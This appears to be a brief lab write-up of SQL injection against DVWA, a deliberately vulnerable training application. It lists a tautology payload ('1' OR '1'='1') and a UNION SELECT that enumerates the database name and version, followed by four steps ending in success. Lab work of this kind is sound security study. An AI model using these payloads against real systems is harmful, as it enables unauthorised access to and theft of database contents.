# SQL Injection

## Payload Used

```sql
1' OR '1'='1
```

## Database Enumeration

```sql
1' UNION SELECT database(),version()#
```

## Description

SQL Injection allows attackers to manipulate SQL queries and retrieve sensitive database information.

## Steps

1. Open DVWA
2. Navigate to SQL Injection
3. Enter payload
4. Retrieved database information successfully
